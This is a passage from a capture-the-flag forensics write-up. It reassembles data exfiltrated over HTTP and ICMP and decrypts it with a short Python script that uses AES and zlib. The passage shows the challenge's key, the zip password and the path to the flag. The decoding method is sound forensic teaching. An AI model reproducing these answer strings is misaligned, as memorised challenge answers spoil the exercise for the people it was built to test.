z6f9HaX|!|0|!|f8e946873b6e3a34035d82b1aadec650edc693c449b064a06bd1c7432e801193b497f998d1265e7e9da7b4ea56d650ae0dfbd717ef4dd1418d2d9b4e68b835f166643a705acd64c60e56add715a064524363bff1152aae8c2b2e82548c7f7f0f69690d18733e42de352ce5bb6fd5b2b696688ad84a80d3862cab8274d4b5a79065f4be827f36cd0271ae6ed1306107437e26bbdfce7fcfe3d0840e03a4bb5b776b5501582240cbaeccc8c6969653973805209cdcdc2e2c70325cabf8ecc8ad7f192b8b0d7c0bde5489a10e23175a4e593641862d625145d3a9f1b8de163325c534bc6c303109f63b2bd7ea5bdd22cefd8e1415b8374811c5d656eac67b924e2f7f170821b77361513ad6d9e0972641f83a8cac5776e09320b657dd0c1d6449c19c032d77d92c80fa991e9eefc585aab8e7a5feb56ea7
z6f9HaX|!|2|!|3de71e0826b4f3c85d0b17931d2effd04913e6320e30e73f5cc652c9e3a7f3bb4bbce092648283324298d594aae4f8bfa73732b492e479c4d1d642310ce0a3344186f9bc21ac86833010ef2bd6b2e31b9251690902b660448f88b9dc48963270d603942fc5910715d0d4f18224316f571116e05be4f0404f468ef856eab4ad6f38683aa0b935d0bc9933231d3262b54aca672be1fd2cb0d59fc49c807de24dc582501396dd54b67efe2fe7687b0c62de63de5c278200c3288269729cf7428fc0b48298699a808a141fc3bee1ba01a90c51faed07c3d35149c5988f9301e2e70a9d955b1545581522f90f4a2e9c88cf8e502bca12128ba0cb77409220c259035bc3ca1727e017713abb08b9491675f20bad831ba685edaefa572ca8da0c56bfb3615048a0764305dc219936237f5764cdc1031d024591c66ef92d38bbe9a73614411e27z6f9HaX|!|3|!|8037dbd29c0393e519050999210fe5ce63880109a09bf879b09b8b9f952d438d51d8b54
[...]
```

Ok, the data follow the following pattern:

> ID|!|number|!|AES encrypted data

## Scripting and decryption time

According the previous scenarios, I just have to sort all packet by number, extract encrypted data and decrypt / decompress it.

Here is my quick and dirty script:

```python
#!/usr/bin/python2

from base64 import b64decode
from Crypto.Cipher import AES
import hashlib
from zlib import compress, decompress

# Function from DET Github
def aes_decrypt(message,key):
    iv = message[:AES.block_size]
    message = message[AES.block_size:]
    aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
    message = aes.decrypt(message)
    unpad = lambda s: s[:-ord(s[len(s)-1:])]
    return unpad(message)

tmp = {}

f = open('data_http.b64','r')
data_http = f.read()
f.close()

data_http = filter(bool, data_http.split('\n'))

clear_http = []

for i in data_http:
  clear_http.append(b64decode(i))

# Dictionnary creation from http data
for i in range(0,len(clear_http)):
  tmp[int(clear_http[i].split('|')[2])] = clear_http[i].split('|')[4]

g = open('data_icmp.b64','r')
data_icmp = g.read().split('\n')
g.close()

clear_icmp = []
for i in data_icmp:
  clear_icmp.append(b64decode(i))

clear_icmp.pop(0)
clear_icmp.pop(0)

# Dictionnary append with icmp data
for j in range(0,len(clear_icmp)):
  tmp[int(clear_icmp[j].split('|')[2])] = clear_icmp[j].split('|')[4]

final = ""

for i in range(0,len(tmp)):
  final += tmp[i]

final = final[:-4]
flag = aes_decrypt(final.decode('hex'),"IMTLD{This_is_just_a_key_not_the_flag}")
flag = decompress(flag) # zlib decompression

h = open('flag.dat','wb')
h.write(flag)
h.close()
print "[+] flag.dat written :)"
```

```bash
$ ./decrypt.py 
[+] flag.dat written :)

$ file flag.dat 
flag.dat: Zip archive data, at least v2.0 to extract

$ unzip -l flag.dat                                                
Archive:  flag.dat
  Length      Date    Time    Name
---------  ---------- -----   ----
    25369  2018-11-09 22:34   flag.jpg
---------                     -------
    25369                     1 file

$ unzip flag.dat
Archive:  flag.dat
[flag.dat] flag.jpg password: IMTLD{N0t_Th3_Fl4g}
  inflating: flag.jpg

$ file flag.jpg 
flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 706x396, components 1
```

## Flag

<center>
![](/img/writeups/santhacklaus2018/mi2_3.jpg)
_Fig 4_: Flag
</center>